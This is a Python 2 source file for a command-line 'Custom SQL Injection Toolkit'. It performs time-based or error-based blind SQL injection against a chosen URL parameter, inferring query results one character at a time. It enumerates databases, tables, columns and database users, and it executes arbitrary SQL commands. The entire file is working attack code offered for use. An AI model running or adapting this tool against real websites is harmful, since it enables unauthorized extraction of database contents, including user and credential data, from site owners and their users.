#!/usr/bin/python

# TODO: Unpack parameter

import urllib
import time
import httplib
import sys
import getopt
import io
import re
import gzip

from urlparse import urlparse

### Blind SQL Injection Type ###
TIMEBASED = 1
ERRORBASED = 2

### Database Type ###
DB_MYSQL = 'mysql'
DB_ORACLE = 'oracle'
DB_MSSQL = 'mssql'

class SQLInject:
    """
    basic class for testing custom blind sql injection
    """
    
    sqli_type = None
    db_backend = None
    param = None
    path = None
    query = None
    trigger = None
    host = None
    data = None
    prefix = None
    postfix = None
    
    database = None
    table = None
    
    char_match = ["e","t","a","o","i","n","s","r","h","l","d","u","c","f","m","w","y","g","p","b","v", "k","x","j","q","z","0","1","2","3","4","5","6","7","8","9","-",".","'","[", "_", "]","+","#","@","$"]
    num_match = ["1",  "2",  "3",  "4",  "5", "6", "7", "8", "9", "0"]
    
    def __init__(self, host = None):
        self.host = host
    
    def __create_header__(self):
        headers = {}
        headers['Host'] = self.host
        headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.9) Gecko/20100501 Iceweasel/3.5.9 (like Firefox/3.5.9)'
        headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        headers['Accept-Language'] = 'en-us,en;q=0.5'
        headers['Accept-Encoding'] = 'gzip,deflate'
        headers['Accept-Charset'] = 'ISO-8859-1,utf-8;q=0.7,*;q=0.7'
        headers['Keep-Alive'] = '300'
        headers['Proxy-Connection'] = 'keep-alive'
        
        return headers

    #################################################################
    ### database enumeration functions ###
    #################################################################
    
    def get_databases(self):
        self.get_output("SELECT DISTINCT(LOWER(schema_name)) FROM information_schema.SCHEMATA")

    def get_tables(self):
        self.get_output("SELECT table_name FROM information_schema.TABLES WHERE table_schema='%s'" % (self.database))

    def get_columns(self):
        self.get_output("SELECT column_name FROM information_schema.COLUMNS WHERE table_name='%s' AND table_schema='%s'" % (self.table, self.database))

    #################################################################
    ### user enumeration functions ###
    #################################################################

    def get_users(self):
        self.get_output("SELECT DISTINCT(grantee) FROM information_schema.USER_PRIVILEGES")

    #################################################################
    ### inference data retrieval functions ###
    #################################################################
    
    def __get_value(self,  command,  matches):
        value = ""
        for pos in range(1, 1000):
            chr = self.get_char(pos, command,  matches)
            if not chr:
                return value
            sys.stdout.write(chr)
            sys.stdout.flush()            
            value += chr
        
    def get_output(self, command):                
        result = {}
        
        ### unpack select values ###
        cmds = self.unpack_select(command)
        lastval = None
        
        for value in cmds.keys():            
            ### get number of rows ###
            cmd = cmds[value]
            result[value] = []
            
            print cmd
            print "[*] number of rows returned by query: ", 
            num_rows = self.get_num_rows(cmd)
            print "\n"
            
            print "[*] retrieving results for " + cmd + ": "
            for row in range(0, num_rows):                
                
                if lastval:
                    cmd += " WHERE %s = '%s'" % (lastval, result[lastval][-1])
                    lastval = value            
                else:
                    lastval = value                        
                    
                ### get output
                print "[+] ",                 
                result[value].append(self.__get_value(cmd + " LIMIT " + str(row)  + ", 1" ,  self.char_match))
                sys.stdout.write("\n")
                
        for row in result.keys():
            print "%-15s" % row, 
        print "\n"
        
        for row in result.keys():
            for val in result[row]:
                print "%-15s" % val
            
        print result
    
    def get_num_rows(self,  command):
        command = re.sub('^(.*) (.*) (FROM .*)', r'\1 COUNT(\2) \3', command)
        
        return int(self.__get_value(command,  self.num_match))
    
    def unpack_select(self,  command):
        cmds = {}
        
        values= re.match("^SELECT (.*) FROM .*", command).group(1)                            
        for value in values.split(','):
            value = value.strip()
            cmds[value] = re.sub('^(.*) (.*) (FROM .*)', r'\1 %s \3', command)  % (value, )
        
        return cmds
    
    def get_char(self, pos,  command,  matches):                
        headers = self.__create_header__()                    
                
        if self.data:
            urlparams = dict([ p.split("=") for p in self.data.split("&")])
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
        else:           
            urlparams = dict([ p.split("=") for p in self.query.split("&")])
            
        if self.param not in urlparams.keys():
            print "Parameter %s is not in parameter list. Exiting." % (self.param, )
            sys.exit(0)            
        
        for c in matches:            
            conn = httplib.HTTPConnection(self.host)  
            urlparams[self.param] = self.prefix + "MID((" + command + ")," + str(pos) + ",1) = '" + c + "')" + self.postfix

            if self.sqli_type == TIMEBASED:                
                t_start = time.time()

            strparams = urllib.urlencode(urlparams) 
            
            if self.data:
                conn.request("POST", self.path,  strparams,  headers)               
                res = conn.getresponse()                
            else:
                conn.request("GET", self.path + "?" + strparams,  None,  headers)                                    
                res = conn.getresponse()

            if self.sqli_type == TIMEBASED:
                t_end = time.time()
                ### Adjust the timeout here ###
                if (t_end - t_start) > 2:
                    return c

            if self.sqli_type == ERRORBASED:
                data = res.read()

                ### check for zipped encoding
                if res.getheader('Content-Encoding',  None) == 'gzip':
                    bs = io.BytesIO(data)
                    stream = gzip.GzipFile(fileobj=bs, mode="rb")
                    data = stream.read()

                if self.trigger in data:
                    return c
                
        # EOL
        return None
            
def usage_exit(exit_code):
    print "%-15s: %s" % ("-h, --help","show this help message")
    print "%-15s: %s" % ("-b, --backend", "database backend (mysql, oracle, mssql)")
    print "%-15s: %s" % ("-u, --url", "url to attack (http://www.vuln.org/index.php?a=foo&b=bar)")
    print "%-15s: %s" % ("-p, --param", "vulnerable parameter")
    print "%-15s: %s" % ("-t, --type", "sqli technique (1=Timebased, 2=Errorbased)")
    print "%-15s: %s" % ("-s, --prefix","attack prefix")
    print "%-15s: %s" % ("-e, --postfix","attack postfix")
    print "%-15s: %s" % ("-c, --command","sql command to execute")
    print "%-15s: %s" % ("-i, --trigger","trigger for error based sqli")
    print "%-15s: %s" % ("-d, --data","use POST instead of GET with the given parameter")
    print ""
    print "%-15s: %s" % ("-D, --databse", "set database")
    print "%-15s: %s" % ("-T, --table", "set table")
    print ""
    print "%-15s: %s" % ("--dbs", "enumerate databses")
    print "%-15s: %s" % ("--tables", "enumerate tables (needs -D)")
    print "%-15s: %s" % ("--columns", "enumerate columns (needs -D and -T)")
    print ""
    print "%-15s: %s" % ("--users", "enumerate databse users")

    sys.exit(exit_code)
               
def main():  

    print "[*] Custom SQL Injection Toolkit - (c) Christian Eichelmann\n"

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hb:u:p:t:s:e:c:i:d:D:T:", ["help", "backend=",  "url=", "param=", "type=", "command=", "trigger=",  "data=",  "prefix=",  "postfix", "dbs",  "database=",  "table", "tables",  "columns",  "users"])
    except getopt.GetoptError:
        usage_exit(2)
    except IndexError:
        usage_exit(2)

    sql = SQLInject()    
    command = None

    ### defaults ###
    sql.sqli_type = ERRORBASED
    sql.db_backend = DB_MYSQL
    enum_db = False
    enum_tables = False
    enum_columns = False
    enum_users = False
    
    for o, a in opts:
        if o in ("-h", "--help"):
            usage_exit(0)            

        if o in ("-u", "--url"):
            url = urlparse(a)
            sql.host = url.hostname
            sql.query = url.query
            sql.path = url.path

        if o in ("-p", "--param"):
            sql.param = str(a)
            
        if o in ("-t", "--type"):        
            sql.sqli_type = int(a)
            if sql.sqli_type != ERRORBASED and sql.sqli_type != TIMEBASED:
                print "Invalid sql injection type: %d" % (int(a), )
                sys.exit(1)
            
        if o in ("-s", "--prefix"):
            sql.prefix = str(a)

        if o in ("-e", "--postfix"):
            sql.postfix = str(a)
            
        if o in ("-c", "--command"):
            command = str(a)
        
        if o in ("-i", "--trigger"):
            sql.trigger = str(a)
            
        if o in ("-d",  "--data"):
            sql.data = str(a)

        if o in ("-D",  "--database"):
            sql.database = str(a)

        if o in ("-T",  "--table"):
            sql.table = str(a)

        if o in ("-b",  "--backend"):
            sql.db_backend = str(a)

        if o == "--dbs":
            enum_db = True
            
        if o == "--tables":
            enum_tables = True            

        if o == "--columns":
            enum_columns = True         
        
        if o == "--users":
            enum_users = True      

    ##################################################
    ### ERROR CHECKING ###
    ##################################################    
    if not sql.host or not sql.path or not sql.param or not sql.prefix or not sql.postfix:
        usage_exit(0)
        
    if sql.sqli_type == ERRORBASED and not sql.trigger:
        usage_exit(0)
        
    if not command and not enum_db and not enum_tables and not enum_columns and not enum_users:
        usage_exit(0)
        
    if enum_tables and not sql.database:
        usage_exit(0)
        
    if enum_columns and (not sql.database or not sql.table):
        usage_exit(0)
            
    ##################################################
    ### DO IT ###
    ##################################################            
    if enum_db:
        sql.get_databases()
            
    if enum_tables:
        sql.get_tables()
        
    if enum_columns:
        sql.get_columns()
        
    if enum_users:
        sql.get_users()
    
    if command:
        sql.get_output(command)            
    
if __name__ == "__main__":
    main()
